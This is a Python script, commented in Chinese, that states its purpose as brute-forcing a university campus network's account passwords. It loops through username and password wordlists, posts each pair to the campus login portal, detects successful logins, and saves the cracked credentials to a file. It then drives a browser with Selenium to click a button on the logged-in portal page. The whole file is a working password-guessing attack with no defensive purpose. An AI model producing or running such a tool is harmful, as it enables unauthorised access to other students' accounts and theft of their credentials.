import requests
from bs4 import BeautifulSoup
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

# todo 暴力破解bua校园网账号密码，先根据学号的规律生成



def begin():
    # 请求头
    head = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE'
    }
    # post和登录页面地址
    login_url = "http://10.0.0.38/a70.htm"

    # 生成账号密码列表
    username = []
    password = []
    # 读取用户账号
    user_12 = open('userId_test.txt')
    while 1:
        line = user_12.readline().strip('\n')
        username.append(line)
        if not line:
            username.pop()
            break

    # 读取密码
    dict = open('password_test.txt')
    while 1:
        line = dict.readline().strip('\n')
        password.append(line)
        if not line:
            password.pop()
            break

    # 用来测试用户名和密码是否被读取
    # print(username)
    # print(password)


    # 暴力循环----这里循环的次数很多 可能会死机

    y = 0
    for i in username:
        for j in password:
            uname = i
            passw = j
            timeout = 5
            # 提交的数据
            post_data = {
                "DDDDD": uname,
                "upass": passw,
                "0MKKey": "登录（Login）"
            }
            # 提交数据
            s = requests.session()
            r2 = s.post(login_url, headers=head, data=post_data, timeout=timeout)

            # 输出基本信息
            y += 1
            print(f"已经运行了{y}次,账号为{uname},密码为{passw}")
            print(f"post连接情况{r2.status_code}")

            # 登录

            urled = "http://10.98.48.6"
            r3 = s.get(urled, headers=head)  # 测试是否已登录成攻
            soup1 = BeautifulSoup(r3.content, 'html.parser')

            # 获取post成功后的页面
            # r3 = s.get(r2.url, headers=head)  # 成功后获取的重定向地址
            # soup1 = BeautifulSoup(r3.content, 'html.parser')


            print("title : ", soup1.title.text)
            print("status : ", soup1.status_code)

            # 密码正确后写入mucpass.txt文件
            if soup1.title.text == '注销页':
                print(f'第{y}次登录成功！,账号为{uname},密码为{passw}')
                f = open('password_real.txt', 'a')
                text = str(uname) + ': ' + passw
                f.write(text + '\n')  # 写入文件

                # 创建 Chrome WebDriver
                driver = webdriver.Chrome()
                try:
                    driver.get("http://10.98.48.6")

                    # 使用XPath定位并等待按钮可点击后点击
                    button_xpath = '//*[@id="tbody"]/tr/td[6]/button'
                    WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, button_xpath)))

                    # 获取按钮元素
                    button = driver.find_element(By.XPATH, button_xpath)

                    # 使用 JavaScript 点击按钮
                    driver.execute_script("arguments[0].click();", button)

                    # 在这里可以添加其他操作，如等待、获取数据等

                except TimeoutException:
                    print("等待超时，无法找到可点击的按钮")

                finally:
                    # 关闭浏览器窗口
                    driver.quit()


# 运行函数
begin()
